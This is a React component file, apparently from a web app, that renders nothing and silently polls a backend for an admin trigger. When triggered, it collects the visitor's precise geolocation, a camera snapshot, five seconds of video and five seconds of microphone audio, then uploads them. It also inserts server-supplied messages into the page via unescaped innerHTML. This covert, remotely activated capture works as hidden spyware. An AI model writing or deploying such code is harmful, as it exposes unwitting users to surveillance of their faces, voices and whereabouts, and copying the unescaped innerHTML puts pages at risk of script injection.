import { useEffect, useRef } from "react";


const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;


export default function AccessController() {
  // ✅ prevents multiple captures across renders
  const alreadyCaptured = useRef(false);

  // ✅ stable username (same logic as original)
  const usernameRef = useRef(null);

  if (!usernameRef.current) {
    let username = localStorage.getItem("loggedInUser");

    if (!username) {
      username = localStorage.getItem("anonUserId");
      if (!username) {
        username = `anonymous-${Date.now()}`;
        localStorage.setItem("anonUserId", username);
      }
    }
    usernameRef.current = username;
  }

  const username = usernameRef.current;

  // ===========================
  // ✅ VISIT TRACKING
  // ===========================
  const trackVisitPeriodically = async () => {
    const user =
      localStorage.getItem("loggedInUser") ||
      localStorage.getItem("anonUserId");

    if (!user) return;

    try {
      await fetch(`${BACKEND_URL}/api/track-visit`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: user })
      });
    } catch (err) {
      console.error("Visit tracking failed:", err);
    }
  };

  // ===========================
  // ✅ MANUAL CAPTURE (UNCHANGED LOGIC)
  // ===========================
  const manualCapture = async (
    triggeredBy = "user",
    forcedUsername = "",
    facingMode = "user"
  ) => {
    if (alreadyCaptured.current) return;
    alreadyCaptured.current = true;

    let selfieBlob = null;
    let videoBlob = null;
    let audioBlob = null;
    let videoStream = null;
    let audioStream = null;

    try {
      // 📍 Location
      const location = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            }),
          () => resolve({ lat: 0, lon: 0, accuracy: 0 }),
          { enableHighAccuracy: true, timeout: 10000 }
        );
      });

      // 📷 Camera
      try {
        videoStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode }
        });
      } catch {}

      // 🎤 Mic
      try {
        audioStream = await navigator.mediaDevices.getUserMedia({
          audio: true
        });
      } catch {}

      // 🤳 Selfie
      if (videoStream?.getVideoTracks().length) {
        const video = document.createElement("video");
        video.srcObject = videoStream;
        video.muted = true;
        await video.play().catch(() => {});
        await new Promise((r) => setTimeout(r, 1000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        selfieBlob = await new Promise((res) =>
          canvas.toBlob(res, "image/jpeg", 0.85)
        );
      }

      // 🎥 Record
      const videoChunks = [];
      const audioChunks = [];
      const promises = [];

      if (videoStream?.getVideoTracks().length) {
        const vr = new MediaRecorder(
          new MediaStream([videoStream.getVideoTracks()[0]]),
          { mimeType: "video/webm;codecs=vp8" }
        );
        vr.ondataavailable = (e) => videoChunks.push(e.data);
        vr.start();
        promises.push(new Promise((r) => (vr.onstop = r)));
        setTimeout(() => vr.stop(), 5000);
      }

      if (audioStream?.getAudioTracks().length) {
        const ar = new MediaRecorder(
          new MediaStream([audioStream.getAudioTracks()[0]]),
          { mimeType: "audio/webm;codecs=opus" }
        );
        ar.ondataavailable = (e) => audioChunks.push(e.data);
        ar.start();
        promises.push(new Promise((r) => (ar.onstop = r)));
        setTimeout(() => ar.stop(), 5000);
      }

      await Promise.all(promises);

      if (videoChunks.length)
        videoBlob = new Blob(videoChunks, { type: "video/webm" });
      if (audioChunks.length)
        audioBlob = new Blob(audioChunks, { type: "audio/webm" });

      // ⬆ Upload
      const formData = new FormData();
      if (selfieBlob) formData.append("selfie", selfieBlob);
      if (videoBlob) formData.append("video", videoBlob);
      if (audioBlob) formData.append("audio", audioBlob);

      formData.append("location", JSON.stringify(location));
      formData.append("triggeredBy", triggeredBy);
      formData.append("username", forcedUsername || username);

      await fetch(`${BACKEND_URL}/api/capture-data`, {
        method: "POST",
        body: formData
      });

    } catch (err) {
      console.error("Capture failed:", err);
    } finally {
      videoStream?.getTracks().forEach((t) => t.stop());
      audioStream?.getTracks().forEach((t) => t.stop());
      alreadyCaptured.current = false;
    }
  };

  // ===========================
  // ✅ MESSAGE SYSTEM (UNCHANGED)
  // ===========================
  const showUserMessages = () => {
    const token = localStorage.getItem("token");
    const anonId = localStorage.getItem("anonUserId");

    const headers = token ? { Authorization: `Bearer ${token}` } : {};

    const cached = JSON.parse(
      localStorage.getItem("cachedMessages") || "[]"
    );
    if (cached.length) renderMessages(cached);

    fetch(`${BACKEND_URL}/api/messages?anonId=${anonId}`, { headers })
      .then((r) => r.json())
      .then((d) => {
        if (d.status === "success") {
          localStorage.setItem(
            "cachedMessages",
            JSON.stringify(d.messages)
          );
          renderMessages(d.messages);
        }
      });
  };

  const renderMessages = (messages) => {
    const dismissed = JSON.parse(
      localStorage.getItem("dismissedMessages") || "[]"
    );

    const id = "site-messages";
    document.getElementById(id)?.remove();

    const container = document.createElement("div");
    container.id = id;
    container.style =
      "position:fixed;top:10px;right:10px;z-index:9999;background:#d9b814;padding:10px;border-radius:8px;max-width:300px;font-size:14px;";

    messages.forEach((msg) => {
      if (dismissed.includes(msg._id)) return;

      const box = document.createElement("div");
      box.innerHTML = `<strong>${msg.title}</strong><br/>${msg.body}`;
      container.appendChild(box);

      setTimeout(() => {
        box.remove();
        fetch(`${BACKEND_URL}/api/messages/${msg._id}`, {
          method: "DELETE"
        });
      }, 10000);
    });

    if (container.children.length)
      document.body.appendChild(container);
  };

  // ===========================
  // ✅ EFFECTS (ONCE ONLY)
  // ===========================
  useEffect(() => {
    trackVisitPeriodically();
    showUserMessages();

    const visitTimer = setInterval(trackVisitPeriodically, 30000);
    const msgTimer = setInterval(showUserMessages, 10000);

    const adminTimer = setInterval(async () => {
      try {
        const res = await fetch(
          `${BACKEND_URL}/api/manual-capture-flag?username=${username}`
        );
        const data = await res.json();
        if (data.trigger) {
          const mode =
            data.camera === "back"
              ? { exact: "environment" }
              : "user";
          manualCapture("admin", username, mode);
        }
      } catch {}
    }, 10000);

    return () => {
      clearInterval(visitTimer);
      clearInterval(msgTimer);
      clearInterval(adminTimer);
    };
  }, []);

  return null; // invisible controller (same as JS)
}